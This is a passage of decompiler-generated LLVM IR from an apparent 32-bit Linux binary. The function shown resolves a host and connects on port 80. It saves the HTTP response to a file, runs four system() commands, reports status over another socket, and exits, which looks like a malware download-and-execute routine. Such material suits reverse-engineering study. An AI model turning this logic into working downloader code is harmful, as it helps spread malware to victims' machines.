  %v5_8054528 = and i32 %v4_8054528, -256
  %v6_8054528 = or i32 %v3_8054528, %v5_8054528
  %v7_8054528 = xor i32 %v6_8054528, 1
  store i32 %v7_8054528, i32* %edx.global-to-local, align 4
  %v1_8054530 = trunc i32 %v7_8054528 to i8
  %v3_8054530 = zext i1 %v0_8054528 to i8
  %v15_8054530 = icmp eq i8 %v1_8054530, %v3_8054530
  %v1_8054539 = icmp eq i1 %v15_8054530, false
  store i1 %v5_80544f4, i1* %cf.global-to-local, align 1
  %v2_8054560 = load i32, i32* %v1_80544f7, align 4
  br i1 %v1_8054539, label %dec_label_pc_805455a, label %dec_label_pc_805453b

dec_label_pc_805453b:                             ; preds = %dec_label_pc_80544f1
  %v1_8054543 = add i32 %v2_8054560, 7
  %v5_8054543 = icmp ugt i32 %v2_8054560, -8
  store i1 %v5_8054543, i1* %cf.global-to-local, align 1
  %v2_805454a = ptrtoint i32* %stack_var_-1096 to i32
  store i32 %v2_805454a, i32* @eax, align 4
  %tmp71 = bitcast i32* %stack_var_-1096 to i8*
  %v5_8054553 = call i32 @strcpy(i8* %tmp71, i32 %v1_8054543)
  br label %dec_label_pc_8054574

dec_label_pc_805455a:                             ; preds = %dec_label_pc_80544f1
  %v2_8054566 = ptrtoint i32* %stack_var_-1096 to i32
  store i32 %v2_8054566, i32* @eax, align 4
  %tmp72 = bitcast i32* %stack_var_-1096 to i8*
  %v5_805456f = call i32 @strcpy(i8* %tmp72, i32 %v2_8054560)
  br label %dec_label_pc_8054574

dec_label_pc_8054574:                             ; preds = %dec_label_pc_805453b, %dec_label_pc_805455a
  %v4_8054597.pre-phi = phi i8* [ %tmp71, %dec_label_pc_805453b ], [ %tmp72, %dec_label_pc_805455a ]
  %v2_8054583.pre-phi = phi i32 [ %v2_805454a, %dec_label_pc_805453b ], [ %v2_8054566, %dec_label_pc_805455a ]
  br label %dec_label_pc_8054580

dec_label_pc_805457d:                             ; preds = %dec_label_pc_80545a8
  %v4_805457d = add i32 %storemerge7, 1
  br label %dec_label_pc_8054580

dec_label_pc_8054580:                             ; preds = %dec_label_pc_8054574, %dec_label_pc_805457d
  %storemerge7 = phi i32 [ %v4_805457d, %dec_label_pc_805457d ], [ 0, %dec_label_pc_8054574 ]
  store i32 %storemerge7, i32* @edx, align 4
  store i1 false, i1* @df, align 1
  store i32 %v2_8054583.pre-phi, i32* @edi, align 4
  %v3_805459d = call i32 @_strlen(i8* %v4_8054597.pre-phi)
  %v0_80545a4 = load i32, i32* @edx, align 4
  %v7_80545a4 = icmp ult i32 %v0_80545a4, %v3_805459d
  store i1 %v7_80545a4, i1* %cf.global-to-local, align 1
  %v1_80545a6 = icmp eq i1 %v7_80545a4, false
  br i1 %v1_80545a6, label %dec_label_pc_8054580.dec_label_pc_80545b7_crit_edge, label %dec_label_pc_80545a8

dec_label_pc_8054580.dec_label_pc_80545b7_crit_edge: ; preds = %dec_label_pc_8054580
  %v0_80545ba.pre = load i32, i32* @ebp, align 4
  %.pre = add i32 %storemerge7, -1092
  br label %dec_label_pc_80545b7

dec_label_pc_80545a8:                             ; preds = %dec_label_pc_8054580
  %v0_80545ab = load i32, i32* @ebp, align 4
  %v2_80545ab = add i32 %storemerge7, -1092
  %v3_80545ab = add i32 %v0_80545ab, %v2_80545ab
  %v4_80545ab = inttoptr i32 %v3_80545ab to i8*
  %v5_80545ab = load i8, i8* %v4_80545ab, align 1
  %v6_80545b3 = icmp ult i8 %v5_80545ab, 47
  store i1 %v6_80545b3, i1* %cf.global-to-local, align 1
  %v10_80545b3 = icmp eq i8 %v5_80545ab, 47
  %v1_80545b5 = icmp eq i1 %v10_80545b3, false
  br i1 %v1_80545b5, label %dec_label_pc_805457d, label %dec_label_pc_80545b7

dec_label_pc_80545b7:                             ; preds = %dec_label_pc_80545a8, %dec_label_pc_8054580.dec_label_pc_80545b7_crit_edge
  %v2_80545ba.pre-phi = phi i32 [ %.pre, %dec_label_pc_8054580.dec_label_pc_80545b7_crit_edge ], [ %v2_80545ab, %dec_label_pc_80545a8 ]
  %v0_80545ba = phi i32 [ %v0_80545ba.pre, %dec_label_pc_8054580.dec_label_pc_80545b7_crit_edge ], [ %v0_80545ab, %dec_label_pc_80545a8 ]
  %v3_80545ba = add i32 %v0_80545ba, %v2_80545ba.pre-phi
  %v4_80545ba = inttoptr i32 %v3_80545ba to i8*
  store i8 0, i8* %v4_80545ba, align 1
  store i32 2, i32* %stack_var_-72, align 4
  %v3_80545cf = call i32 @htons(i16 80)
  %v2_80545e4 = call i32 @inet_addr(i32 %v2_8054583.pre-phi)
  %v8_80545ec = icmp ne i32 %v2_80545e4, -1
  store i1 %v8_80545ec, i1* %cf.global-to-local, align 1
  %v13_80545ec = icmp eq i32 %v2_80545e4, -1
  %v1_80545f0 = icmp eq i1 %v13_80545ec, false
  br i1 %v1_80545f0, label %dec_label_pc_805464e, label %dec_label_pc_80545f2

dec_label_pc_80545f2:                             ; preds = %dec_label_pc_80545b7
  %v2_80545fb = call i32 @__GI_gethostbyname(i32 %v2_8054583.pre-phi)
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8054603 = icmp eq i32 %v2_80545fb, 0
  %v1_8054607 = icmp eq i1 %v4_8054603, false
  br i1 %v1_8054607, label %dec_label_pc_805462f, label %dec_label_pc_8054609

dec_label_pc_8054609:                             ; preds = %dec_label_pc_80545f2
  %v4_805461e = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_80696f8.41 to i32))
  %v2_805462a = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_805462f

dec_label_pc_805462f:                             ; preds = %dec_label_pc_80545f2, %dec_label_pc_8054609
  %v1_8054632 = add i32 %v2_80545fb, 12
  %v2_8054632 = inttoptr i32 %v1_8054632 to i32*
  %v3_8054632 = load i32, i32* %v2_8054632, align 4
  %v1_805463a = add i32 %v2_80545fb, 16
  %v2_805463a = inttoptr i32 %v1_805463a to i32*
  %v3_805463a = load i32, i32* %v2_805463a, align 4
  %v1_805463d = inttoptr i32 %v3_805463a to i32*
  %v2_805463d = load i32, i32* %v1_805463d, align 4
  store i32 %v2_805463d, i32* %edx.global-to-local, align 4
  %v5_8054642 = icmp eq i32* %stack_var_-72, inttoptr (i32 -4 to i32*)
  store i1 %v5_8054642, i1* %cf.global-to-local, align 1
  %v15_8054642 = ptrtoint i32* %stack_var_-68 to i32
  %tmp73 = bitcast i32* %stack_var_-68 to i8*
  store i32 %v15_8054642, i32* @edi, align 4
  %v1_8054647 = inttoptr i32 %v2_805463d to i8*
  store i32 %v2_805463d, i32* @esi, align 4
  store i1 false, i1* @df, align 1
  %v7_805464a = call i8* @_memcpy(i8* %tmp73, i8* %v1_8054647, i32 %v3_8054632)
  br label %dec_label_pc_8054654

dec_label_pc_805464e:                             ; preds = %dec_label_pc_80545b7
  store i32 %v2_80545e4, i32* %stack_var_-68, align 4
  br label %dec_label_pc_8054654

dec_label_pc_8054654:                             ; preds = %dec_label_pc_805462f, %dec_label_pc_805464e
  %v2_8054664.pre-phi = ptrtoint i32* %stack_var_-72 to i32
  %v5_8054667 = icmp ugt i32* %stack_var_-72, inttoptr (i32 -9 to i32*)
  store i1 %v5_8054667, i1* %cf.global-to-local, align 1
  %tmp74 = bitcast i32* %stack_var_-64 to i8*
  %v6_805466d = call i32 @__GI_memset(i8* %tmp74, i32 0, i32 8)
  %v5_8054687 = call i32 @connect(i32 %v5_80544bd, i32 %v2_8054664.pre-phi, i32 16)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_805468c = icmp eq i32 %v5_8054687, 0
  br i1 %v1_805468c, label %dec_label_pc_8054654.dec_label_pc_80546b6_crit_edge, label %dec_label_pc_8054690

dec_label_pc_8054654.dec_label_pc_80546b6_crit_edge: ; preds = %dec_label_pc_8054654
  br label %dec_label_pc_80546b6

dec_label_pc_8054690:                             ; preds = %dec_label_pc_8054654
  %v4_80546a5 = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_8069720.42 to i32))
  %v2_80546b1 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_80546b6

dec_label_pc_80546b6:                             ; preds = %dec_label_pc_8054654.dec_label_pc_80546b6_crit_edge, %dec_label_pc_8054690
  %v2_80546c1 = add i32 %storemerge7, %v2_8054583.pre-phi
  %v7_80546c1 = icmp ult i32 %v2_80546c1, %v2_8054583.pre-phi
  store i1 %v7_80546c1, i1* %cf.global-to-local, align 1
  %v1_80546c3 = add i32 %v2_80546c1, 1
  store i32 %v1_80546c3, i32* %edx.global-to-local, align 4
  %v4_80546e2 = call i32 @Send(i32 %v5_80544bd, i32 ptrtoint ([277 x i8]* @global_var_806b70c.449 to i32))
  %v4_80546fc = call i32 @Send(i32 %arg1, i32 ptrtoint ([28 x i8]* @global_var_806985c.44 to i32))
  %v1_8054704 = add i32 %arg4, 8
  %v5_8054704 = icmp ugt i32 %arg4, -9
  store i1 %v5_8054704, i1* %cf.global-to-local, align 1
  %v1_8054707 = inttoptr i32 %v1_8054704 to i32*
  %v2_8054707 = load i32, i32* %v1_8054707, align 4
  store i32 %v2_8054707, i32* @eax, align 4
  %v4_8054714 = call i32 @__GI_fopen(i32 %v2_8054707, i32 ptrtoint ([3 x i8]* @global_var_8069878.45 to i32))
  %v2_805472c = ptrtoint i32* %stack_var_-5192 to i32
  %v6_805473c121 = call i32 @recv(i32 %v5_80544bd, i32 %v2_805472c, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp75124 = icmp slt i32 %v6_805473c121, 1
  br i1 %tmp75124, label %dec_label_pc_8054864.loopexit13, label %dec_label_pc_805474e

dec_label_pc_805471c.loopexit:                    ; preds = %dec_label_pc_8054850
  %v6_805473c = call i32 @recv(i32 %v5_80544bd, i32 %v2_805472c, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp75 = icmp slt i32 %v6_805473c, 1
  br i1 %tmp75, label %dec_label_pc_8054864.loopexit13, label %dec_label_pc_805474e

dec_label_pc_805474e:                             ; preds = %dec_label_pc_80546b6, %dec_label_pc_805471c.loopexit
  %v6_805473c125 = phi i32 [ %v6_805473c, %dec_label_pc_805471c.loopexit ], [ %v6_805473c121, %dec_label_pc_80546b6 ]
  %v4_805474e = add i32 %v6_805473c125, -4095
  %v8_805474e = icmp ult i32 %v6_805473c125, 4095
  %v9_805474e = sub i32 4094, %v6_805473c125
  %v10_805474e = and i32 %v9_805474e, %v6_805473c125
  %v11_805474e = icmp slt i32 %v10_805474e, 0
  store i1 %v8_805474e, i1* %cf.global-to-local, align 1
  %v12_805474e = icmp eq i32 %v4_805474e, 0
  %v13_805474e = icmp slt i32 %v4_805474e, 0
  %v3_8054755 = icmp eq i1 %v13_805474e, %v11_805474e
  %v4_8054755 = icmp eq i1 %v12_805474e, false
  %v5_8054755 = and i1 %v4_8054755, %v3_8054755
  br i1 %v5_8054755, label %dec_label_pc_805476e.lr.ph, label %dec_label_pc_8054757

dec_label_pc_8054757:                             ; preds = %dec_label_pc_805474e
  %v0_805475a = load i32, i32* @ebp, align 4
  %v2_805475a = add i32 %v6_805473c125, -5188
  %v3_805475a = add i32 %v2_805475a, %v0_805475a
  %v4_805475a = inttoptr i32 %v3_805475a to i8*
  store i8 0, i8* %v4_805475a, align 1
  br label %dec_label_pc_805476e.lr.ph

dec_label_pc_805476e.lr.ph:                       ; preds = %dec_label_pc_8054757, %dec_label_pc_805474e
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_805476e

dec_label_pc_805476e:                             ; preds = %dec_label_pc_805476e.lr.ph, %dec_label_pc_8054850
  %storemerge6120 = phi i32 [ 0, %dec_label_pc_805476e.lr.ph ], [ %v4_8054850, %dec_label_pc_8054850 ]
  store i32 %storemerge6120, i32* %edx.global-to-local, align 4
  %v2_8054779 = add i32 %storemerge6120, %v2_805472c
  %v7_8054779 = icmp ult i32 %v2_8054779, %v2_805472c
  store i1 %v7_8054779, i1* %cf.global-to-local, align 1
  store i1 false, i1* @df, align 1
  %v4_8054796 = inttoptr i32 %v2_8054779 to i8*
  store i32 %v2_8054779, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_806987b.46 to i32), i32* @edi, align 4
  %v7_80547a8 = call i32 @_strncmp(i8* %v4_8054796, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_806987b.46, i32 0, i32 0), i32 4)
  %v8_80547a8 = urem i32 %v7_80547a8, 2
  %v9_80547a8 = icmp eq i32 %v8_80547a8, 0
  %v0_80547aa = load i1, i1* %cf.global-to-local, align 1
  %v2_80547aa = or i1 %v0_80547aa, %v9_80547a8
  %v3_80547aa = zext i1 %v2_80547aa to i32
  %v4_80547aa = load i32, i32* %edx.global-to-local, align 4
  %v5_80547aa = and i32 %v4_80547aa, -256
  %v6_80547aa = or i32 %v3_80547aa, %v5_80547aa
  %v7_80547aa = xor i32 %v6_80547aa, 1
  store i32 %v7_80547aa, i32* %edx.global-to-local, align 4
  %v3_80547b0 = and i32 %v7_80547a8, -256
  %v1_80547b2 = trunc i32 %v7_80547aa to i8
  %v3_80547b2 = zext i1 %v0_80547aa to i8
  %v4_80547b2 = sub nsw i8 %v1_80547b2, %v3_80547b2
  %v15_80547b2 = icmp eq i8 %v4_80547b2, 0
  %v20_80547b2 = zext i8 %v4_80547b2 to i32
  %v23_80547b2 = or i32 %v20_80547b2, %v3_80547b0
  store i32 %v23_80547b2, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80547bb = icmp eq i1 %v15_80547b2, false
  br i1 %v1_80547bb, label %dec_label_pc_8054850, label %dec_label_pc_80547c1

dec_label_pc_80547c1:                             ; preds = %dec_label_pc_805476e
  %v4_80547c1 = add i32 %storemerge6120, 4
  %v1_80547d0 = add i32 %v4_8054714, 52
  %v2_80547d0 = inttoptr i32 %v1_80547d0 to i32*
  %v1_80547da = add i32 %v4_8054714, 16
  %v2_80547da = inttoptr i32 %v1_80547da to i32*
  %v1_80547e0 = add i32 %v4_8054714, 28
  %v2_80547e0 = inttoptr i32 %v1_80547e0 to i32*
  %v10_8054845102 = icmp ult i32 %v4_80547c1, %v6_805473c125
  store i1 %v10_8054845102, i1* %cf.global-to-local, align 1
  %v5_8054848109 = icmp slt i32 %v4_80547c1, %v6_805473c125
  br i1 %v5_8054848109, label %dec_label_pc_80547c7, label %dec_label_pc_8054864

dec_label_pc_80547c7:                             ; preds = %dec_label_pc_80547c1, %dec_label_pc_805483f
  %storemerge11.in110 = phi i32 [ %v4_805483f, %dec_label_pc_805483f ], [ %v4_80547c1, %dec_label_pc_80547c1 ]
  %v3_80547d0 = load i32, i32* %v2_80547d0, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80547d3 = icmp eq i32 %v3_80547d0, 0
  br i1 %v1_80547d3, label %dec_label_pc_8054822, label %dec_label_pc_80547d7

dec_label_pc_80547d7:                             ; preds = %dec_label_pc_80547c7
  %v3_80547da = load i32, i32* %v2_80547da, align 4
  store i32 %v3_80547da, i32* %edx.global-to-local, align 4
  %v3_80547e0 = load i32, i32* %v2_80547e0, align 4
  %v7_80547e3 = icmp ult i32 %v3_80547da, %v3_80547e0
  store i1 %v7_80547e3, i1* %cf.global-to-local, align 1
  %v1_80547e5 = icmp eq i1 %v7_80547e3, false
  br i1 %v1_80547e5, label %dec_label_pc_8054803, label %dec_label_pc_80547e7

dec_label_pc_80547e7:                             ; preds = %dec_label_pc_80547d7
  %v3_80547ea = load i32, i32* %v2_80547da, align 4
  store i32 %v3_80547ea, i32* %edx.global-to-local, align 4
  %v0_80547f0 = load i32, i32* @ebp, align 4
  %v2_80547f0 = add i32 %storemerge11.in110, -5188
  %v3_80547f0 = add i32 %v2_80547f0, %v0_80547f0
  %v4_80547f0 = inttoptr i32 %v3_80547f0 to i8*
  %v5_80547f0 = load i8, i8* %v4_80547f0, align 1
  %v3_80547f8 = inttoptr i32 %v3_80547ea to i8*
  store i8 %v5_80547f0, i8* %v3_80547f8, align 1
  %v0_80547fa = load i32, i32* %edx.global-to-local, align 4
  %v1_80547fa = add i32 %v0_80547fa, 1
  store i32 %v1_80547fa, i32* %edx.global-to-local, align 4
  store i32 %v1_80547fa, i32* %v2_80547da, align 4
  br label %dec_label_pc_805483f

dec_label_pc_8054803:                             ; preds = %dec_label_pc_80547d7
  %v0_8054806 = load i32, i32* @ebp, align 4
  %v2_8054806 = add i32 %storemerge11.in110, -5188
  %v3_8054806 = add i32 %v2_8054806, %v0_8054806
  %v4_8054806 = inttoptr i32 %v3_8054806 to i8*
  %v5_8054806 = load i8, i8* %v4_8054806, align 1
  %v6_8054806 = zext i8 %v5_8054806 to i32
  store i32 %v6_8054806, i32* @edx, align 4
  %v5_805481b = call i32 @putc_unlocked(i8 %v5_8054806, i32 %v4_8054714)
  br label %dec_label_pc_805483f

dec_label_pc_8054822:                             ; preds = %dec_label_pc_80547c7
  %v0_8054825 = load i32, i32* @ebp, align 4
  %v2_8054825 = add i32 %storemerge11.in110, -5188
  %v3_8054825 = add i32 %v2_8054825, %v0_8054825
  %v4_8054825 = inttoptr i32 %v3_8054825 to i8*
  %v5_8054825 = load i8, i8* %v4_8054825, align 1
  %v6_8054825 = zext i8 %v5_8054825 to i32
  store i32 %v6_8054825, i32* @edx, align 4
  %v5_805483a = call i32 @__GI_fputc(i8 %v5_8054825, i32 %v4_8054714)
  br label %dec_label_pc_805483f

dec_label_pc_805483f:                             ; preds = %dec_label_pc_8054803, %dec_label_pc_80547e7, %dec_label_pc_8054822
  %v4_805483f = add i32 %storemerge11.in110, 1
  %v10_8054845 = icmp ult i32 %v4_805483f, %v6_805473c125
  store i1 %v10_8054845, i1* %cf.global-to-local, align 1
  %exitcond130 = icmp eq i32 %v4_805483f, %v6_805473c125
  br i1 %exitcond130, label %dec_label_pc_8054864, label %dec_label_pc_80547c7

dec_label_pc_8054850:                             ; preds = %dec_label_pc_805476e
  %v4_8054850 = add nuw nsw i32 %storemerge6120, 1
  %v10_8054856 = icmp ult i32 %v4_8054850, %v6_805473c125
  store i1 %v10_8054856, i1* %cf.global-to-local, align 1
  %v5_8054859 = icmp slt i32 %v4_8054850, %v6_805473c125
  br i1 %v5_8054859, label %dec_label_pc_805476e, label %dec_label_pc_805471c.loopexit

dec_label_pc_8054864.loopexit13:                  ; preds = %dec_label_pc_805471c.loopexit, %dec_label_pc_80546b6
  %.pre24 = add i32 %v4_8054714, 52
  %.pre25 = inttoptr i32 %.pre24 to i32*
  %.pre26 = add i32 %v4_8054714, 16
  %.pre27 = inttoptr i32 %.pre26 to i32*
  %.pre28 = add i32 %v4_8054714, 28
  %.pre29 = inttoptr i32 %.pre28 to i32*
  br label %dec_label_pc_8054864

dec_label_pc_8054864:                             ; preds = %dec_label_pc_80547c1, %dec_label_pc_805483f, %dec_label_pc_8054864.loopexit13
  %v2_80548f2.pre-phi = phi i32* [ %.pre29, %dec_label_pc_8054864.loopexit13 ], [ %v2_80547e0, %dec_label_pc_805483f ], [ %v2_80547e0, %dec_label_pc_80547c1 ]
  %v2_80548ec.pre-phi = phi i32* [ %.pre27, %dec_label_pc_8054864.loopexit13 ], [ %v2_80547da, %dec_label_pc_805483f ], [ %v2_80547da, %dec_label_pc_80547c1 ]
  %v2_80548e2.pre-phi = phi i32* [ %.pre25, %dec_label_pc_8054864.loopexit13 ], [ %v2_80547d0, %dec_label_pc_805483f ], [ %v2_80547d0, %dec_label_pc_80547c1 ]
  store i1 %v5_8054704, i1* %cf.global-to-local, align 1
  %v4_8054885 = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_806b824.450 to i32))
  %v6_80548aa96 = call i32 @recv(i32 %v5_80544bd, i32 %v2_805472c, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp7699 = icmp slt i32 %v6_80548aa96, 1
  br i1 %tmp7699, label %dec_label_pc_8054965, label %dec_label_pc_80548bc

dec_label_pc_805488a.loopexit:                    ; preds = %dec_label_pc_8054951
  %v6_80548aa = call i32 @recv(i32 %v5_80544bd, i32 %v2_805472c, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp76 = icmp slt i32 %v6_80548aa, 1
  br i1 %tmp76, label %dec_label_pc_8054965, label %dec_label_pc_80548bc

dec_label_pc_80548bc:                             ; preds = %dec_label_pc_8054864, %dec_label_pc_805488a.loopexit
  %v6_80548aa100 = phi i32 [ %v6_80548aa, %dec_label_pc_805488a.loopexit ], [ %v6_80548aa96, %dec_label_pc_8054864 ]
  %v4_80548bc = add i32 %v6_80548aa100, -4095
  %v8_80548bc = icmp ult i32 %v6_80548aa100, 4095
  %v9_80548bc = sub i32 4094, %v6_80548aa100
  %v10_80548bc = and i32 %v9_80548bc, %v6_80548aa100
  %v11_80548bc = icmp slt i32 %v10_80548bc, 0
  store i1 %v8_80548bc, i1* %cf.global-to-local, align 1
  %v12_80548bc = icmp eq i32 %v4_80548bc, 0
  %v13_80548bc = icmp slt i32 %v4_80548bc, 0
  %v3_80548c3 = icmp eq i1 %v13_80548bc, %v11_80548bc
  %v4_80548c3 = icmp eq i1 %v12_80548bc, false
  %v5_80548c3 = and i1 %v4_80548c3, %v3_80548c3
  br i1 %v5_80548c3, label %dec_label_pc_80548d9.lr.ph, label %dec_label_pc_80548c5

dec_label_pc_80548c5:                             ; preds = %dec_label_pc_80548bc
  %v0_80548c8 = load i32, i32* @ebp, align 4
  %v2_80548c8 = add i32 %v6_80548aa100, -5188
  %v3_80548c8 = add i32 %v2_80548c8, %v0_80548c8
  %v4_80548c8 = inttoptr i32 %v3_80548c8 to i8*
  store i8 0, i8* %v4_80548c8, align 1
  br label %dec_label_pc_80548d9.lr.ph

dec_label_pc_80548d9.lr.ph:                       ; preds = %dec_label_pc_80548c5, %dec_label_pc_80548bc
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_80548d9

dec_label_pc_80548d9:                             ; preds = %dec_label_pc_8054951, %dec_label_pc_80548d9.lr.ph
  %storemerge95 = phi i32 [ 0, %dec_label_pc_80548d9.lr.ph ], [ %v4_8054951, %dec_label_pc_8054951 ]
  %v3_80548e2 = load i32, i32* %v2_80548e2.pre-phi, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80548e5 = icmp eq i32 %v3_80548e2, 0
  br i1 %v1_80548e5, label %dec_label_pc_8054934, label %dec_label_pc_80548e9

dec_label_pc_80548e9:                             ; preds = %dec_label_pc_80548d9
  %v3_80548ec = load i32, i32* %v2_80548ec.pre-phi, align 4
  store i32 %v3_80548ec, i32* %edx.global-to-local, align 4
  %v3_80548f2 = load i32, i32* %v2_80548f2.pre-phi, align 4
  %v7_80548f5 = icmp ult i32 %v3_80548ec, %v3_80548f2
  store i1 %v7_80548f5, i1* %cf.global-to-local, align 1
  %v1_80548f7 = icmp eq i1 %v7_80548f5, false
  br i1 %v1_80548f7, label %dec_label_pc_8054915, label %dec_label_pc_80548f9

dec_label_pc_80548f9:                             ; preds = %dec_label_pc_80548e9
  %v3_80548fc = load i32, i32* %v2_80548ec.pre-phi, align 4
  store i32 %v3_80548fc, i32* %edx.global-to-local, align 4
  %v0_8054902 = load i32, i32* @ebp, align 4
  %v2_8054902 = add nsw i32 %storemerge95, -5188
  %v3_8054902 = add i32 %v2_8054902, %v0_8054902
  %v4_8054902 = inttoptr i32 %v3_8054902 to i8*
  %v5_8054902 = load i8, i8* %v4_8054902, align 1
  %v3_805490a = inttoptr i32 %v3_80548fc to i8*
  store i8 %v5_8054902, i8* %v3_805490a, align 1
  %v0_805490c = load i32, i32* %edx.global-to-local, align 4
  %v1_805490c = add i32 %v0_805490c, 1
  store i32 %v1_805490c, i32* %edx.global-to-local, align 4
  store i32 %v1_805490c, i32* %v2_80548ec.pre-phi, align 4
  br label %dec_label_pc_8054951

dec_label_pc_8054915:                             ; preds = %dec_label_pc_80548e9
  %v0_8054918 = load i32, i32* @ebp, align 4
  %v2_8054918 = add nsw i32 %storemerge95, -5188
  %v3_8054918 = add i32 %v2_8054918, %v0_8054918
  %v4_8054918 = inttoptr i32 %v3_8054918 to i8*
  %v5_8054918 = load i8, i8* %v4_8054918, align 1
  %v6_8054918 = zext i8 %v5_8054918 to i32
  store i32 %v6_8054918, i32* @edx, align 4
  %v5_805492d = call i32 @putc_unlocked(i8 %v5_8054918, i32 %v4_8054714)
  br label %dec_label_pc_8054951

dec_label_pc_8054934:                             ; preds = %dec_label_pc_80548d9
  %v0_8054937 = load i32, i32* @ebp, align 4
  %v2_8054937 = add nsw i32 %storemerge95, -5188
  %v3_8054937 = add i32 %v2_8054937, %v0_8054937
  %v4_8054937 = inttoptr i32 %v3_8054937 to i8*
  %v5_8054937 = load i8, i8* %v4_8054937, align 1
  %v6_8054937 = zext i8 %v5_8054937 to i32
  store i32 %v6_8054937, i32* @edx, align 4
  %v5_805494c = call i32 @__GI_fputc(i8 %v5_8054937, i32 %v4_8054714)
  br label %dec_label_pc_8054951

dec_label_pc_8054951:                             ; preds = %dec_label_pc_8054915, %dec_label_pc_80548f9, %dec_label_pc_8054934
  %v4_8054951 = add nuw nsw i32 %storemerge95, 1
  %v10_8054957 = icmp ult i32 %v4_8054951, %v6_80548aa100
  store i1 %v10_8054957, i1* %cf.global-to-local, align 1
  %exitcond = icmp eq i32 %v4_8054951, %v6_80548aa100
  br i1 %exitcond, label %dec_label_pc_805488a.loopexit, label %dec_label_pc_80548d9

dec_label_pc_8054965:                             ; preds = %dec_label_pc_805488a.loopexit, %dec_label_pc_8054864
  %tmp77 = inttoptr i32 %v4_8054714 to i16*
  %v3_805496b = call i32 @__GI_fclose(i16* %tmp77)
  %v2_8054976 = call i32 @close(i32 %v5_80544bd)
  %v2_8054981 = load i32, i32* %v1_8054707, align 4
  store i32 %v2_8054981, i32* %edx.global-to-local, align 4
  store i1 %v5_8054704, i1* %cf.global-to-local, align 1
  %v2_805499b = ptrtoint i32* %stack_var_-5447 to i32
  %v4_80549a4 = call i32 @sprintf(i32 %v2_805499b, i32 ptrtoint ([21 x i8]* @global_var_806b84b.451 to i32))
  %v2_80549b2 = call i32 @system(i32 %v2_805499b)
  store i1 %v5_8054704, i1* %cf.global-to-local, align 1
  %v2_80549cb = ptrtoint i32* %stack_var_-5702 to i32
  %v4_80549d4 = call i32 @sprintf(i32 %v2_80549cb, i32 ptrtoint ([9 x i8]* @global_var_806b860.452 to i32))
  %v2_80549e2 = call i32 @system(i32 %v2_80549cb)
  store i1 %v5_8054704, i1* %cf.global-to-local, align 1
  %v2_80549fb = ptrtoint i32* %stack_var_-5957 to i32
  %v4_8054a04 = call i32 @sprintf(i32 %v2_80549fb, i32 ptrtoint ([22 x i8]* @global_var_806b869.453 to i32))
  %v2_8054a12 = call i32 @system(i32 %v2_80549fb)
  store i1 %v5_8054704, i1* %cf.global-to-local, align 1
  %v2_8054a2b = ptrtoint i32* %stack_var_-6212 to i32
  %v4_8054a34 = call i32 @sprintf(i32 %v2_8054a2b, i32 ptrtoint ([18 x i8]* @global_var_806b87f.454 to i32))
  %v2_8054a42 = call i32 @system(i32 %v2_8054a2b)
  %v2_8054a4e = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8054a53

dec_label_pc_8054a53:                             ; preds = %entry, %dec_label_pc_8054965
  %v0_8054a5c = phi i32 [ %v2_805446d, %entry ], [ %v2_8054a4e, %dec_label_pc_8054965 ]
  %v0_8054a53 = load i32, i32* @esp, align 4
  %v2_8054a53 = icmp ugt i32 %v0_8054a53, -6257
  store i1 %v2_8054a53, i1* %cf.global-to-local, align 1
  ret i32 %v0_8054a5c

; uselistorder directives
  uselistorder i32 %storemerge95, { 0, 3, 2, 1 }
  uselistorder i32 %v4_80548bc, { 1, 0 }
  uselistorder i32 %v6_80548aa100, { 0, 4, 5, 6, 3, 1, 2 }
  uselistorder i32* %v2_80548ec.pre-phi, { 2, 1, 0 }
  uselistorder i32 %v4_8054850, { 1, 0, 2 }
  uselistorder i32 %v4_805483f, { 1, 2, 0 }
  uselistorder i32 %storemerge11.in110, { 0, 3, 2, 1 }
  uselistorder i1 %v0_80547aa, { 1, 0 }
  uselistorder i32 %v7_80547a8, { 1, 0 }
  uselistorder i32 %storemerge6120, { 2, 0, 3, 1 }
  uselistorder i32 %v4_805474e, { 1, 0 }
  uselistorder i32 %v6_805473c125, { 7, 8, 3, 0, 2, 1, 9, 10, 6, 4, 5 }
  uselistorder i32 %v2_805472c, { 3, 1, 4, 2, 5, 0 }
  uselistorder i32 %v4_8054714, { 10, 9, 8, 0, 1, 2, 6, 3, 5, 4, 7 }
  uselistorder i32 %v2_80545e4, { 1, 0, 2 }
  uselistorder i32 %storemerge7, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_8054583.pre-phi, { 3, 0, 4, 2, 1 }
  uselistorder i32 %v2_8054560, { 2, 0, 1 }
  uselistorder i1 %v0_8054528, { 1, 0 }
  uselistorder i32 %v5_80544bd, { 3, 4, 2, 5, 1, 6, 7, 0, 8 }
  uselistorder i32 %v4_805447a, { 1, 0 }
  uselistorder i32* %stack_var_-1096, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-72, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-68, { 1, 0, 2 }
  uselistorder i1* %cf.global-to-local, { 0, 1, 2, 3, 4, 7, 5, 6, 37, 8, 9, 38, 10, 17, 13, 11, 12, 39, 14, 15, 16, 40, 18, 19, 41, 20, 21, 22, 23, 24, 25, 26, 27, 28, 30, 29, 31, 32, 33, 34, 35, 36 }
  uselistorder i32 4095, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i8 47, { 0, 2, 3, 1, 4 }
